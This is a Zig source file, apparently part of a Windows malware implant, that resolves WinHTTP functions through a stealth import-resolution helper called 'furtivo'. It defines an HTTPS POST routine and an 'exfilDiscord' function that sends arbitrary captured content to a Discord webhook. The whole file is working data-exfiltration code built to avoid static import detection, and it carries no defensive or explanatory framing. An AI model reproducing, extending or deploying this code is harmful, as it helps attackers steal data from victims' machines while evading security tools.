const std = @import("std");
const furtivo = @import("furtivo.zig");

// Function type signatures for WinHTTP
const WinHttpOpenFn = *const fn (pwszUserAgent: ?[*:0]const u16, dwAccessType: u32, pwszProxyName: ?[*:0]const u16, pwszProxyBypass: ?[*:0]const u16, dwFlags: u32) callconv(.winapi) ?*anyopaque;
const WinHttpConnectFn = *const fn (hSession: ?*anyopaque, pswzServerName: [*:0]const u16, nServerPort: u16, dwReserved: u32) callconv(.winapi) ?*anyopaque;
const WinHttpOpenRequestFn = *const fn (hConnect: ?*anyopaque, pwszVerb: [*:0]const u16, pwszObjectName: [*:0]const u16, pwszVersion: ?[*:0]const u16, pwszReferrer: ?[*:0]const u16, ppwszAcceptTypes: ?*?[*:0]const u16, dwFlags: u32) callconv(.winapi) ?*anyopaque;
const WinHttpSendRequestFn = *const fn (hRequest: ?*anyopaque, lpszHeaders: ?[*:0]const u16, dwHeadersLength: u32, lpOptional: ?*const anyopaque, dwOptionalLength: u32, dwTotalLength: u32, dwContext: usize) callconv(.winapi) c_int;
const WinHttpReceiveResponseFn = *const fn (hRequest: ?*anyopaque, lpReserved: ?*anyopaque) callconv(.winapi) c_int;
const WinHttpCloseHandleFn = *const fn (hInternet: ?*anyopaque) callconv(.winapi) c_int;

const WINHTTP_ACCESS_TYPE_DEFAULT_PROXY = 0;
const INTERNET_DEFAULT_HTTPS_PORT: u16 = 443;
const WINHTTP_FLAG_SECURE = 0x00800000;

fn toUtf16Z(allocator: std.mem.Allocator, str: []const u8) ![*:0]u16 {
    return std.unicode.utf8ToUtf16LeAllocZ(allocator, str);
}

pub fn sendRequest(allocator: std.mem.Allocator, host: []const u8, path: []const u8, data: []const u8) !void {
    const winhttp = furtivo.getModuleHandle("winhttp.dll");
    if (winhttp == 0) return error.WinHttpNotFound;

    const Open = @as(?WinHttpOpenFn, @ptrFromInt(furtivo.getProcAddress(winhttp, "WinHttpOpen"))) orelse return error.ProcNotFound;
    const Connect = @as(?WinHttpConnectFn, @ptrFromInt(furtivo.getProcAddress(winhttp, "WinHttpConnect"))) orelse return error.ProcNotFound;
    const OpenRequest = @as(?WinHttpOpenRequestFn, @ptrFromInt(furtivo.getProcAddress(winhttp, "WinHttpOpenRequest"))) orelse return error.ProcNotFound;
    const SendRequest = @as(?WinHttpSendRequestFn, @ptrFromInt(furtivo.getProcAddress(winhttp, "WinHttpSendRequest"))) orelse return error.ProcNotFound;
    const ReceiveResponse = @as(?WinHttpReceiveResponseFn, @ptrFromInt(furtivo.getProcAddress(winhttp, "WinHttpReceiveResponse"))) orelse return error.ProcNotFound;
    const CloseHandle = @as(?WinHttpCloseHandleFn, @ptrFromInt(furtivo.getProcAddress(winhttp, "WinHttpCloseHandle"))) orelse return error.ProcNotFound;

    const host_w = try toUtf16Z(allocator, host);
    defer allocator.free(host_w);
    const path_w = try toUtf16Z(allocator, path);
    defer allocator.free(path_w);
    const method_w = try toUtf16Z(allocator, "POST");
    defer allocator.free(method_w);
    const headers_w = try toUtf16Z(allocator, "Content-Type: application/json\r\n");
    defer allocator.free(headers_w);

    const hSession = Open(null, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, null, null, 0);
    if (hSession == null) return error.WinHttpOpenFailed;
    defer _ = CloseHandle(hSession);

    const hConnect = Connect(hSession, host_w, INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (hConnect == null) return error.WinHttpConnectFailed;
    defer _ = CloseHandle(hConnect);

    const hRequest = OpenRequest(hConnect, method_w, path_w, null, null, null, WINHTTP_FLAG_SECURE);
    if (hRequest == null) return error.WinHttpOpenRequestFailed;
    defer _ = CloseHandle(hRequest);

    if (SendRequest(hRequest, headers_w, @intCast(std.mem.len(headers_w)), data.ptr, @intCast(data.len), @intCast(data.len), 0) == 0) {
        return error.WinHttpSendRequestFailed;
    }

    if (ReceiveResponse(hRequest, null) == 0) {
        return error.WinHttpReceiveResponseFailed;
    }
}

pub fn exfilDiscord(allocator: std.mem.Allocator, webhook_host: []const u8, webhook_path: []const u8, content: []const u8) !void {
    const json = try std.fmt.allocPrint(allocator, "{{\"content\": \"{s}\"}}", .{content});
    defer allocator.free(json);
    try sendRequest(allocator, webhook_host, webhook_path, json);
}
